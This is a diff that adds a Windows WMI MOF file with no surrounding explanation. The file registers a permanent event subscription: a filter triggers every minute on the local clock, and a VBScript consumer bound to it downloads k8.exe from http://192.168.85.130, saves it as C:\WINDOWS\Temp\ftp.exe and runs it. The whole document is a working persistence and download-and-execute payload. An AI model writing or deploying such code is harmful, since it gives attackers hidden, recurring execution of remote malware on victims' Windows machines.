@@ -1,0 +1,24 @@
+#pragma namespace("\\\\.\\root\\subscription")
+
+instance of __EventFilter as $EventFilter
+{
+    EventNamespace = "Root\\Cimv2";
+    Name  = "filtP2";
+    Query = "Select * From __InstanceModificationEvent "
+            "Where TargetInstance Isa \"Win32_LocalTime\" "
+            "And TargetInstance.Second = 5";
+    QueryLanguage = "WQL";
+};
+
+instance of ActiveScriptEventConsumer as $Consumer
+{
+Name = "consPCSV2";
+ScriptingEngine = "VBScript";
+ScriptText ="Set Post = CreateObject(\"Msxml2.XMLHTTP\")\nSet Shell = CreateObject(\"Wscript.Shell\")\nPost.Open \"GET\",\"http://192.168.85.130/k8.exe\",0\nPost.Send()\nSet aGet = CreateObject(\"ADODB.Stream\")\naGet.Mode = 3\naGet.Type = 1\naGet.Open()\naGet.Write(Post.responseBody)\naGet.SaveToFile \"C:\\WINDOWS\\Temp\\ftp.exe\",2\nShell.Run (\"C:\\WINDOWS\\Temp\\ftp.exe\")";
+};
+
+instance of __FilterToConsumerBinding
+{
+    Consumer   = $Consumer;
+    Filter = $EventFilter;
+};
